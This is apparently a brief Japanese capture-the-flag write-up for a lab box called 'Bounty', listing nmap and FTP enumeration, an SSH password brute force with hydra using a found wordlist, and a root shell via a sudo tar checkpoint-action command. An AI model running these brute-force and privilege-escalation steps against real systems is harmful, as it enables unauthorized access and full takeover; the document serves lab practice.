---
title: "Bounty"
date: 2024-03-16T11:06:05+09:00
draft: false
---

### enum

- nmap
  - 21:ftp
  - 22:ssh
- ftp
  - locks.txt
  - task.txt

### user.txt

- hydra ssh で locks.txt を使う
- user.txt が見える

### root.txt

- sudo -l で ```(root) /bin/tar
- ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
- root.txt ゲット
